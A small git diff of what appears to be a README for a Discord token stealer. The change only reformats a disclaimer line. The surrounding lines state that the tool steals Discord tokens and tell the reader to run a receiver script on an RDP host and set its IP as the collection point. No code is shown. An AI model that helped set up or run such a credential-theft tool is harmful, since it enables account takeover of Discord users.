@@ -2,7 +2,7 @@
 - This basically steals discord token.
 
 # Disclamer:
-This is for educational purposes only, I am not responsible for what or for whom.
+- This is for educational purposes only, I am not responsible for what or for whom.
  
 ## run rec.py on rdp or somewhere also modify helpme to the ip of the rdp 
 ```
